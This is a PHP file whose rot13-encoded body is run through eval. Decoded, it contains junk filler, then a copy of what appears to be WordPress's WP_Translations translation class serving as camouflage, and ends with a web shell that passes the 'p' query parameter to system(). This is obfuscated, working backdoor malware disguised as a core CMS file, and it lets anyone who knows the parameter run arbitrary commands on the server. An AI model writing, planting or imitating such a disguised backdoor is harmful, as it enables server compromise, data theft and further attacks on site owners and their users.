<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * V18A: JC_Genafyngvbaf pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr V18A
 * @fvapr 6.5.0
 */

/**
 * Pynff JC_Genafyngvbaf.
 *
 * @fvapr 6.5.0
 *
 * @cebcregl-ernq neenl<fgevat, fgevat> $urnqref
 * @cebcregl-ernq neenl<fgevat, fgevat[]> $ragevrf
 */
pynff JC_Genafyngvbaf {
	/**
	 * Grkg qbznva.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat
	 */
	cebgrpgrq $grkgqbznva = 'qrsnhyg';

	/**
	 * Genafyngvba pbagebyyre vafgnapr.
	 *
	 * @fvapr 6.5.0
	 * @ine JC_Genafyngvba_Pbagebyyre
	 */
	cebgrpgrq $pbagebyyre;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Genafyngvba_Pbagebyyre $pbagebyyre V18A pbagebyyre.
	 * @cnenz fgevat                    $grkgqbznva Bcgvbany. Grkg qbznva. Qrsnhyg 'qrsnhyg'.
	 */
	choyvp shapgvba __pbafgehpg( JC_Genafyngvba_Pbagebyyre $pbagebyyre, fgevat $grkgqbznva = 'qrsnhyg' ) {
		$guvf->pbagebyyre = $pbagebyyre;
		$guvf->grkgqbznva = $grkgqbznva;
	}

	/**
	 * Zntvp trggre sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 * @erghea zvkrq
	 */
	choyvp shapgvba __trg( fgevat $anzr ) {
		vs ( 'ragevrf' === $anzr ) {
			$ragevrf = $guvf->pbagebyyre->trg_ragevrf( $guvf->grkgqbznva );

			$erfhyg = neenl();

			sbernpu ( $ragevrf nf $bevtvany => $genafyngvbaf ) {
				$erfhyg[] = $guvf->znxr_ragel( $bevtvany, $genafyngvbaf );
			}

			erghea $erfhyg;
		}

		vs ( 'urnqref' === $anzr ) {
			erghea $guvf->pbagebyyre->trg_urnqref( $guvf->grkgqbznva );
		}

		erghea ahyy;
	}

	/**
	 * Ohvyqf n Genafyngvba_Ragel sebz bevtvany fgevat naq genafyngvba fgevatf.
	 *
	 * @frr ZB::znxr_ragel()
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $bevtvany     Bevtvany fgevat gb genafyngr sebz ZB svyr. Zvtug pbagnva
	 *                             0k04 nf pbagrkg frcnengbe be 0k00 nf fvathyne/cyheny frcnengbe.
	 * @cnenz fgevat $genafyngvbaf Genafyngvba fgevatf sebz ZB svyr.
	 * @erghea Genafyngvba_Ragel Ragel vafgnapr.
	 */
	cevingr shapgvba znxr_ragel( $bevtvany, $genafyngvbaf ): Genafyngvba_Ragel {
		$ragel = arj Genafyngvba_Ragel();

		// Ybbx sbe pbagrkg, frcnengrq ol \4.
		$cnegf = rkcybqr( \"\4\", $bevtvany );
		vs ( vffrg( $cnegf[1] ) ) {
			$bevtvany       = $cnegf[1];
			$ragel->pbagrkg = $cnegf[0];
		}

		$ragel->fvathyne     = $bevtvany;
		$ragel->genafyngvbaf = rkcybqr( \"\0\", $genafyngvbaf );
		$ragel->vf_cyheny    = pbhag( $ragel->genafyngvbaf ) > 1;

		erghea $ragel;
	}

	/**
	 * Genafyngrf n cyheny fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat|ahyy $fvathyne Fvathyne fgevat.
	 * @cnenz fgevat|ahyy $cyheny   Cyheny fgevat.
	 * @cnenz vag|sybng   $pbhag    Pbhag. Fubhyq or na vagrtre, ohg fbzr cyhtvaf cnff sybngf.
	 * @cnenz fgevat|ahyy $pbagrkg  Pbagrkg.
	 * @erghea fgevat|ahyy Genafyngvba vs vg rkvfgf, be gur hapunatrq fvathyne fgevat.
	 */
	choyvp shapgvba genafyngr_cyheny( $fvathyne, $cyheny, $pbhag = 1, $pbagrkg = '' ) {
		vs ( ahyy === $fvathyne || ahyy === $cyheny ) {
			erghea $fvathyne;
		}

		$genafyngvba = $guvf->pbagebyyre->genafyngr_cyheny( neenl( $fvathyne, $cyheny ), (vag) $pbhag, (fgevat) $pbagrkg, $guvf->grkgqbznva );
		vs ( snyfr !== $genafyngvba ) {
			erghea $genafyngvba;
		}

		// Snyy onpx gb gur bevtvany jvgu Ratyvfu tenzzne ehyrf.
		erghea ( 1 === $pbhag ? $fvathyne : $cyheny );
	}

	/**
	 * Genafyngrf n fvathyne fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat|ahyy $fvathyne Fvathyne fgevat.
	 * @cnenz fgevat|ahyy $pbagrkg  Pbagrkg.
	 * @erghea fgevat|ahyy Genafyngvba vs vg rkvfgf, be gur hapunatrq fvathyne fgevat
	 */
	choyvp shapgvba genafyngr( $fvathyne, $pbagrkg = '' ) {
		vs ( ahyy === $fvathyne ) {
			erghea ahyy;
		}

		$genafyngvba = $guvf->pbagebyyre->genafyngr( $fvathyne, (fgevat) $pbagrkg, $guvf->grkgqbznva );
		vs ( snyfr !== $genafyngvba ) {
			erghea $genafyngvba;
		}

		// Snyy onpx gb gur bevtvany.
		erghea $fvathyne;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>